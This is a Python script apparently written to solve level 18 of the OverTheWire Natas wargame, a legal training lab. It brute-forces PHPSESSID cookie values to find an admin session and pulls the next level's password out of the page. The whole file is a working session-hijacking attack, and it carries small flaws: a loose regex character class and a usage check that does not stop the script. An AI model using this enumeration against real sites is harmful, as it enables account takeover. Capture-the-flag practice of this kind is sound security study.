import sys
import requests
import re

def bruteforce_user_password():

    url = "http://natas18.natas.labs.overthewire.org"

    auth=("natas18",sys.argv[1])

    response = requests.get(url, auth=auth)

    for session_id in range(641):

        print(f"Enumerating session id: {session_id}")

        response = requests.get(url + "/index.php", auth=auth, cookies={
            "PHPSESSID": str(session_id)
        })

        if "login as an admin" not in response.text.lower():

            print(response.request._cookies)

            pattern = re.compile(r"Password: [a-zA-z0-9]{32}")
            match = pattern.search(response.text)

            if match:
                print(match.group())
            break

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage python.py <file.py> natas_password")
    bruteforce_user_password()
